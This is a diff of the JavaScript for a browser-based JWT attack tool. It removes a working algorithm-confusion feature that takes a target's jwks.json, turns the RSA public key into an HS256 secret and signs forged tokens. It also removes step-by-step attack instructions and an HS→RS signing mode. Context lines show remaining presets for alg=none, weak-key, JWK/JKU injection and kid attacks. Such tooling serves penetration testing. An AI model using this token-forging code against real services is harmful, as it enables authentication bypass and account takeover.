@@ -22,9 +22,6 @@ const jwksOutput = document.getElementById('jwksOutput');
 const attackSteps = document.getElementById('attackSteps');
 const kidTools = document.getElementById('kidTools');
 const kidAlgSelect = document.getElementById('kidAlgSelect');
-const confusionTools = document.getElementById('confusionTools');
-const confusionMode = document.getElementById('confusionMode');
-const confusionHelp = document.getElementById('confusionHelp');
 const generateBtn = document.getElementById('generateBtn');
 const resultToken = document.getElementById('resultToken');
 const attackNotes = document.getElementById('attackNotes');
@@ -43,7 +40,6 @@ embedJwkSignBtn.addEventListener('click', () => generateJwkAttackToken(true));
 genJkuRsaBtn.addEventListener('click', generateJkuKeyMaterial);
 copyJwksBtn.addEventListener('click', copyJwksJson);
 signJkuBtn.addEventListener('click', () => generateJwkAttackToken(true));
-if (confusionMode) confusionMode.addEventListener('change', updateConfusionInputHint);
 
 for (const btn of document.querySelectorAll('[data-attack]')) {
   btn.addEventListener('click', () => {
@@ -52,7 +48,6 @@ for (const btn of document.querySelectorAll('[data-attack]')) {
     configureInputForAttack(selectedAttack);
     attackNotes.textContent = getPresetHint(selectedAttack);
     attackSteps.textContent = getAttackSteps(selectedAttack);
-    if (selectedAttack === 'algorithm-confusion' && confusionMode) updateConfusionInputHint();
   });
 }
 
@@ -85,11 +80,6 @@ async function generateJwkAttackToken(forceJwkSign) {
       notes = ['alg=none candidate generated.'];
     }
 
-
-    if (selectedAttack === 'algorithm-confusion') {
-      await generateAlgorithmConfusionToken(baseHeader, payload);
-      return;
-    }
 
     if (selectedAttack === 'weak-signing-key') {
       const secret = requireInput('Please enter signing key/secret.');
@@ -188,21 +178,11 @@ function configureInputForAttack(key) {
   jwkTools.classList.add('hidden');
   jkuTools.classList.add('hidden');
   kidTools.classList.add('hidden');
-  confusionTools.classList.add('hidden');
   extraInput.classList.remove('hidden');
   extraInputLabel.classList.remove('hidden');
   extraInputHelp.classList.remove('hidden');
 
   if (key === 'weak-signing-key') return showInput('Weak key / secret', 'secret1', 'Required for HS attack.');
-
-  if (key === 'algorithm-confusion') {
-    attackInputSection.classList.remove('hidden');
-    if (confusionMode) confusionMode.value = confusionMode.value || 'rs_hs';
-    showInput('Key input', '{"keys":[{"kty":"RSA","n":"...","e":"AQAB"}]}', 'RS→HS: paste full jwks.json content. HS→RS: optional private key (PEM/JWK) for signing.');
-    confusionTools.classList.remove('hidden');
-    updateConfusionInputHint();
-    return;
-  }
 
   if (key === 'jwk-header-injection') {
     showInput('Public JWK JSON', '{"kty":"RSA","e":"AQAB","n":"..."}', 'Required JWK to inject. Generate key by selected alg below.');
@@ -286,17 +266,6 @@ function getAttackSteps(key) {
     ].join('\n');
   }
 
-  if (key === 'algorithm-confusion') {
-    return [
-      '1) Choose confusion mode (RS→HS or HS→RS).',
-      '2) RS→HS mode: paste full /jwks.json response into Attack-specific input.',
-      '3) Tool auto-switches alg to HS256 and signs with public-key material as HMAC secret.',
-      '4) HS→RS mode: optionally paste RSA private key (PEM/JWK) or let tool auto-generate key.',
-      '5) Click Generate to build and sign token automatically.',
-      '6) Send request with generated token and validate behavior.',
-    ].join('\n');
-  }
-
   if (key === 'weak-signing-key') {
     return [
       '1) Paste source JWT and click Decode token.',
@@ -325,7 +294,6 @@ function getPresetHint(key) {
   const hints = {
     'unverified-signature': 'Generates token with invalid signature.',
     'flawed-signature': 'Generates alg=none token with empty signature.',
-    'algorithm-confusion': 'Select RS→HS or HS→RS mode and generate.',
     'weak-signing-key': 'Requires user-provided secret.',
     'jwk-header-injection': 'Choose algorithm, generate key, then generate token.',
     'jku-header-injection': 'Requires jku URL.',
@@ -484,121 +452,6 @@ function randomSecret(length) {
 
 
 
-
-function updateConfusionInputHint() {
-  if (!confusionMode) return;
-  if (confusionMode.value === 'rs_hs') {
-    extraInputLabel.textContent = 'RS→HS key input';
-    extraInput.placeholder = '{"keys":[{...RSA JWK...}]}';
-    extraInputHelp.textContent = 'Paste full jwks.json content from target (including the outer {"keys":[...]} object).';
-    confusionHelp.textContent = 'RS→HS uses the RSA public key from jwks.json as HS256 secret.';
-  } else {
-    extraInputLabel.textContent = 'HS→RS private key input (optional)';
-    extraInput.placeholder = 'Private JWK JSON or PEM private key';
-    extraInputHelp.textContent = 'Optional: paste private key (JWK/PEM). Leave empty to auto-generate RSA key.';
-    confusionHelp.textContent = 'HS→RS creates RS256 token signed with provided (or generated) private key.';
-  }
-}
-
-async function generateAlgorithmConfusionToken(baseHeader, payload) {
-  const mode = confusionMode?.value || 'rs_hs';
-  const nextHeader = { ...baseHeader };
-  delete nextHeader.jwk;
-  delete nextHeader.jku;
-
-  if (mode === 'rs_hs') {
-    const keyInput = requireInput('Provide full jwks.json content for RS->HS mode.');
-    const keyBytes = await parseAlgorithmConfusionKey(keyInput);
-    nextHeader.alg = 'HS256';
-
-    const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
-    const signature = await hmacSignBase64urlBytes(signingInput, keyBytes, 'SHA-256');
-    resultToken.value = `${signingInput}.${signature}`;
-    attackNotes.textContent = 'Algorithm confusion RS→HS token generated and signed using jwks.json public key material.';
-    return;
-  }
-
-  nextHeader.alg = 'RS256';
-  const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
-  const privateKeyInput = extraInput.value.trim();
-
-  let signature;
-  if (privateKeyInput) {
-    signature = await rsaPkcs1SignFromInputBase64url(signingInput, privateKeyInput, 'SHA-256');
-  } else {
-    const material = await generateKeyMaterialForAlg('RS256');
-    signature = await signWithMaterial(signingInput, 'RS256', material);
-  }
-  resultToken.value = `${signingInput}.${signature}`;
-  attackNotes.textContent = 'Algorithm confusion HS→RS token generated and signed.';
-}
-
-async function rsaPkcs1SignFromInputBase64url(message, keyInput, hash) {
-  const trimmed = keyInput.trim();
-  if (trimmed.startsWith('{')) {
-    const jwk = JSON.parse(trimmed);
-    return rsaPkcs1SignBase64url(message, jwk, hash);
-  }
-
-  const privateKey = await importPemPrivateKey(trimmed, hash);
-  const signature = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', privateKey, new TextEncoder().encode(message));
-  return arrayBufferToBase64url(signature);
-}
-
-async function importPemPrivateKey(pem, hash) {
-  const clean = pem
-    .replace('-----BEGIN PRIVATE KEY-----', '')
-    .replace('-----END PRIVATE KEY-----', '')
-    .replace(/\s+/g, '');
-  const keyData = base64ToBytes(clean);
-  return crypto.subtle.importKey(
-    'pkcs8',
-    keyData.buffer,
-    { name: 'RSASSA-PKCS1-v1_5', hash },
-    false,
-    ['sign'],
-  );
-}
-
-async function parseAlgorithmConfusionKey(input) {
-  const value = input.trim();
-
-  if (value.startsWith('{')) {
-    const parsed = JSON.parse(value);
-    if (!Array.isArray(parsed.keys) || parsed.keys.length === 0) {
-      throw new Error('Expected full jwks.json with non-empty keys array.');
-    }
-    const jwk = parsed.keys[0];
-    if (!jwk || jwk.kty !== 'RSA') throw new Error('Algorithm confusion currently expects RSA key in jwks.json.');
-
-    const key = await crypto.subtle.importKey(
-      'jwk',
-      jwk,
-      { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
-      true,
-      ['verify'],
-    );
-    const spki = await crypto.subtle.exportKey('spki', key);
-    const pem = spkiToPem(spki);
-    return new TextEncoder().encode(pem);
-  }
-
-  if (value.includes('BEGIN PUBLIC KEY') || value.includes('BEGIN RSA PUBLIC KEY')) {
-    return new TextEncoder().encode(value);
-  }
-
-  return base64ToBytes(value);
-}
-
-function spkiToPem(spkiBuffer) {
-  const bytes = new Uint8Array(spkiBuffer);
-  let binary = '';
-  for (const b of bytes) binary += String.fromCharCode(b);
-  const b64 = btoa(binary).match(/.{1,64}/g).join('\n');
-  return `-----BEGIN PUBLIC KEY-----
-${b64}
------END PUBLIC KEY-----`;
-}
 
 function base64ToBytes(b64) {
   const normalized = base64urlToBase64(b64);
